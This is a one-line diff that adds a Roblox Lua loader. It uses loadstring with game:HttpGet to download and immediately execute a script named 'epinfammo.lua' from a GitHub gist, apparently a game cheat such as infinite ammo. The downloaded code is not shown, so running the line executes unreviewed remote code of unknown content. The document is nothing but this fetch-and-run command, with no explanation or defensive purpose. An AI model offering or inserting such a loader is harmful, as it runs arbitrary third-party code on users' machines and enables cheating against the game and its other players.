@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/MarieJoker/72c6ca19afaf7589bfd362bd5c08b1c0/raw/daf9e459551305c23db3928a2c326255634ad801/epinfammo.lua"))();
